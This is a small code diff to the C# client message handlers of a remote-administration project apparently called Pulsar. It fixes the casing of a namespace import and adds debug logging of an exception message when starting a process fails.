@@ -6,7 +6,7 @@ using Pulsar.Common.Enums;
 using Pulsar.Common.Helpers;
 using Pulsar.Common.Messages;
 using Pulsar.Common.Messages.Administration.TaskManager;
-using Pulsar.Common.Messages.other;
+using Pulsar.Common.Messages.Other;
 using Pulsar.Common.Networking;
 using System;
 using System.ComponentModel;
@@ -180,6 +180,7 @@ namespace Pulsar.Client.Messages
                             }
                             catch (Exception ex)
                             {
+                                Debug.WriteLine(ex.Message);
                                 _client.Send(new DoProcessResponse { Action = ProcessAction.Start, Result = false });
                             }
                         }).Start();
